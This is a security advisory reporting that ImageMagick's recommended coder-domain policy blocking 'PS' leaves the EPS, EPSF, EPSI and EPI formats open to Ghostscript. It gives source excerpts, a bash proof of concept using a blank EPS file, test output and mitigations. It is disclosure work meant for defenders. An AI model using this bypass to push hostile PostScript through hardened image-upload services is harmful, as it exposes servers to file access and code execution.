# ImageMagick/ImageMagick: coder domain policy `pattern="PS"` does not block EPS/EPSF/EPSI/EPI — Ghostscript executes

**Package**: ImageMagick
**Ecosystem**: N/A (C library, distributed via OS packages and source)
**Affected versions**: 7.x through 7.1.2-26 (latest tested); 6.x likely affected
**Patched versions**: none
**Severity**: High
**CVSS 3.1**: `AV:N/AC:L/PR:N/UI:N/S:C/C:L/I:L/A:N` — **7.2**
**CWE**: CWE-284 (Improper Access Control), CWE-863 (Incorrect Authorization)

## Summary

The ImageMagick `policy.xml` hardening guide instructs administrators to add
`<policy domain="coder" rights="none" pattern="PS"/>` to block PostScript/Ghostscript
processing. This policy only matches files where the internal format identifier
equals `"PS"`. The PostScript coder module (`coders/ps.c`) registers five format
names under the same module: `PS`, `EPS`, `EPSF`, `EPSI`, and `EPI`. The policy
check (`IsCoderAuthorized`) evaluates the format name, not the module name, so any
EPS-family file bypasses the restriction and causes Ghostscript to execute on the
attacker-controlled content.

## Description

`coders/ps.c` registers all PostScript variants under the single module `"PS"`:

```c
entry = AcquireMagickInfo("PS", "EPS",  "Encapsulated PostScript");  // line 979
entry = AcquireMagickInfo("PS", "EPSF", "Encapsulated PostScript");  // line 988
entry = AcquireMagickInfo("PS", "EPSI", "Encapsulated PostScript Interchange"); // line 997
entry = AcquireMagickInfo("PS", "EPI",  "Encapsulated PostScript Interchange"); // line 969
```

The arguments are `(module, format, description)`. `IsCoderAuthorized` at
`MagickCore/constitute.c:454` checks the format name:

```c
status = IsRightsAuthorized(CoderPolicyDomain, rights, coder);
// coder = read_info->magick = "EPS" for a .eps file
// policy pattern = "PS"
// "PS" does not match "EPS" → check passes → Ghostscript executes
```

The module name is checked separately against `ModulePolicyDomain` (line 456), but
only `domain="module"` policies reach that branch. A `domain="coder"` policy with
`pattern="PS"` never evaluates the module name.

> Source-anchor note: line numbers drift by ~6 lines depending on the pinned commit;
> `magick -list format` confirms the `EPS`/`EPSF`/`EPSI`/`EPI → module PS` mapping
> directly regardless of commit.

## Proof of Concept

```bash
#!/usr/bin/env bash
# Requires ImageMagick 7.x and Ghostscript installed.

# 1. Write a policy that "blocks PS"
CONF=$(mktemp -d)
cat > "$CONF/policy.xml" << 'EOF'
<?xml version="1.0" encoding="UTF-8"?>
<!DOCTYPE policymap [
  <!ELEMENT policymap (policy)*>
  <!ELEMENT policy EMPTY>
  <!ATTLIST policy domain NMTOKEN #REQUIRED>
  <!ATTLIST policy rights NMTOKEN #IMPLIED>
  <!ATTLIST policy pattern CDATA #IMPLIED>
]>
<policymap>
  <policy domain="coder" rights="none" pattern="PS"/>
</policymap>
EOF

# 2. Minimal EPS file
printf '%%!PS-Adobe-3.0 EPSF-3.0\n%%%%BoundingBox: 0 0 72 72\nshowpage\n' > /tmp/test.eps

# 3. Explicit PS: prefix — correctly blocked
echo -n "PS: prefix (should block): "
MAGICK_CONFIGURE_PATH="$CONF" magick PS:/tmp/test.eps /tmp/out.png 2>&1 \
  && echo "FAIL (not blocked)" || echo "OK (blocked)"

# 4. .eps extension — bypass
echo -n ".eps file (should block):  "
MAGICK_CONFIGURE_PATH="$CONF" magick /tmp/test.eps /tmp/out_eps.png 2>&1 \
  && echo "BYPASS — Ghostscript executed" || echo "OK (blocked)"

# 5. module policy — blocks all variants
cat > "$CONF/policy.xml" << 'EOF'
<policymap>
  <policy domain="module" rights="none" pattern="PS"/>
</policymap>
EOF
echo -n ".eps file with module policy: "
MAGICK_CONFIGURE_PATH="$CONF" magick /tmp/test.eps /tmp/out_mod.png 2>&1 \
  && echo "FAIL (not blocked)" || echo "OK (blocked)"
```

**Output on ImageMagick 7.1.2-26** (real Ghostscript executed, produced a 420-byte
rendered PNG on the bypass path):
```
PS: prefix (should block): OK (blocked)
.eps file (should block):  BYPASS — Ghostscript executed
.eps file with module policy: OK (blocked)
```

## Impact

Administrators following ImageMagick's own security hardening guide believe they
have blocked Ghostscript execution, but any user-uploaded file with a `.eps`
extension bypasses the restriction. Ghostscript with `-dSAFER` still presents a
significant attack surface (multiple CVEs in recent years). Without `-dSAFER`,
PostScript can read and write arbitrary files via the `file` operator.

Any web service that processes user-uploaded images with ImageMagick and relies on
`policy.xml` to block PostScript is affected.

## Mitigation

Use `domain="module"` to block by module name (covers all PS variants):

```xml
<policy domain="module" rights="none" pattern="PS"/>
```

Or block each format name explicitly:

```xml
<policy domain="coder" rights="none" pattern="PS"/>
<policy domain="coder" rights="none" pattern="EPS*"/>
<policy domain="coder" rights="none" pattern="EPI"/>
```

Or block at the delegate level:

```xml
<policy domain="delegate" rights="none" pattern="gs"/>
```

The existing security documentation and policy.xml template should be updated to
call out the distinction between `domain="coder"` and `domain="module"` for the PS
module, and the recommended hardening snippet should use `domain="module"`.
